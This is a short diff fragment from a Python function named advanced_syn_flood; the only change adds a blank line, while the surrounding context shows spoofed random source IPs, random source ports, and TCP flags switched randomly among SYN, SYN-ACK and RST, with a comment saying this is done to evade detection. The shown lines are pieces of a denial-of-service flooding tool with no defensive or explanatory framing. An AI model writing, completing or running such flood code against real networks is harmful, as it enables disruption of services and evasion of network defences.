@@ -19,6 +19,7 @@ def advanced_syn_flood():
             src_ip = random_ip()  # Spoofed source IP
             src_port = random.randint(1024, 65535)
             
+            
             # Randomly switch between SYN, SYN-ACK, and RST to evade detection
             flags = random.choice(["S", "SA", "R"])
 
